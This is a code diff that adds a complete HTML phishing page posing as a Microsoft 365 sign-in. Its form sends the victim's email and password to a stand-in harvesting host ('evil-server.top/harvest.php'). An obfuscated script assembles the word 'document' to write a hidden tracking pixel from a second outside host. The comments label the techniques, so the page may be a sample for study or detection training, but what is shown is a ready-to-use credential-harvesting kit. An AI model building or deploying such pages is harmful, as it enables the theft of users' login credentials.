@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft 365 - Sign In</title>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Sign in to your Microsoft account</h1>
+        <!-- Obfuscated action URL -->
+        <form id="loginForm" action="http://evil-server.top/harvest.php" method="POST">
+            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="pwd" placeholder="Password" required>
+            <button type="submit">Sign in</button>
+        </form>
+    </div>
+
+    <script>
+        // JS Obfuscation often used in credential harvesting
+        var a = "d"; var b = "o"; var c = "c"; var d = "u"; var e = "m"; var f = "e"; var g = "n"; var h = "t";
+        var obj = a+b+c+d+e+f+g+h;
+        window[obj].write("<img src='http://tracking-pixel.xyz/track' style='display:none'>");
+    </script>
+</body>
+</html>
